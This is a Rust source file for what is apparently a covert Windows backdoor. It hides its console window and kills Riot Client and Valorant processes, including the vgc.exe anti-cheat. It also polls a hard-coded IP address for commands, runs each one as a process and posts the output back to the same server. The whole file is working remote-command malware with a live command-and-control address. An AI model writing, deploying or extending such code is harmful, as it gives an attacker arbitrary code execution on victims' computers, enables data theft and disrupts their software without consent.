#![windows_subsystem = "windows"]


use std::io::Read;
use std::process::Command;
use std::thread::sleep;
use std::time::Duration;

use reqwest::Client;
use serde_json::Value;
use sysinfo::System;

#[tokio::main]
async fn main() {
	println!("Client");
	let client = &Client::new();
	let banned = vec![
		"RiotClientServices.exe".into(),
		"Riot Client.exe".into(),
		"VALORANT.exe".into(),
		"vgc.exe".into(),
	];
	loop {
		sleep(Duration::from_secs(1));
		close_processes(&banned);
		let _ = recv_command(client).await;
	}
}

fn close_processes(names: &Vec<String>) {
	let mut sys = System::new();
	sys.refresh_all();
	for (_, proc) in sys.processes() {
		if names.contains(&proc.name().to_string()) { proc.kill(); }
	}
}


async fn recv_command(client: &Client) {
	let res = match reqwest::get("http://185.128.107.176:8080/recv").await {
		Ok(res) => res,
		Err(_) => return,
	};

	if res.status() != 200 {
		return;
	}
	let body = match res.text().await {
		Ok(body) => {
			body
		}
		Err(_) => return,
	};

	let body = match parse_msg(&body) {
		Some(body) => body,
		None => return,
	};

	let mut parts = body.split_whitespace();
	let cmd = match parts.next() {
		Some(cmd) => cmd,
		None => return,
	};
	let child = match Command::new(cmd).args(parts).spawn() {
		Ok(child) => child,
		Err(e) => {
			dbg!(e);
			return;
		}
	};

	if let Some(mut stdout) = child.stdout {
		let mut output = Vec::new();
		if stdout.read_to_end(&mut output).is_ok() {
			let _ = send_stdout(String::from_utf8_lossy(&output).to_string(), client).await;
		}
	}
}



fn parse_msg(json: &str) -> Option<String> {
	let data = match serde_json::from_str::<Value>(json) {
		Ok(data) => data,
		Err(_) => return None,
	};

	let data_object = data.get("data")?;
	let message = data_object.get("message")?;
	let message_str = message.as_str()?;
	Some(message_str.to_string())
}

async fn send_stdout(output: String, client: &Client) {
	println!("output: {}", output);
	let _ = client.post("http://185.128.107.176:8080/sendhost").body(output).send().await;
}
